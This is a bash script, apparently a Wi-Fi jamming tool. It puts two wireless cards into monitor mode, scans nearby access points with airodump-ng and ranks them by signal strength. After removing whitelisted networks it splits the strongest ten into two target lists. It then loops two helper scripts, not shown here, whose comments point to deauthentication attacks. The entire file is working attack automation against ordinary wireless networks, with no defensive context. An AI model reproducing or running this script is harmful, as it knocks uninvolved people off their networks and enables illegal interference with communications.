#!/usr/bin/env bash

while [ true ]; do
apCount=10      #number of aps to jam
packets=15      #number of pakets to send in deauth mode
timetoscan=30   #number of seconds to scan
timetojam=10    #number of seconds to run while loop for jamming
wl=white.txt    #file with white(not to jam) networks

airmon-ng check kill
airmon-ng start wlan1
airmon-ng start wlan2

timeout --foreground $timetoscan airodump-ng --band abg --ignore-negative-one -o csv -w scan wlan1

cat scan*.csv | sed -e '1,2d' | sed -e '/Station/,$d' | cut -f1,4,9,14 -d ',' | sort -k3 -n -r | sed -e '/\r/d'  > wifiAP.txt

if [ ! -z "$wl" ]; then
	while IFS='' read -r line || [[ -n "$line" ]]; do
    		sed -i -e "/ $line$/d" wifiAP.txt
	done < "$wl"
fi

head --lines=$apCount wifiAP.txt > macListwl1.txt

while IFS='' read -r line || [[ -n "$line" ]]; do
	sed -i -e "/$line*/d" wifiAP.txt
done < "macListwl1.txt"

head --lines=$apCount wifiAP.txt > macListwl2.txt

rm scan*

end=$((SECONDS+timetojam))

while [ $SECONDS -lt $end ]; do
	timeout $((end - SECONDS)) bash wl1jam.sh &
	timeout $((end - SECONDS)) bash wl2jam.sh &
	wait
done

done
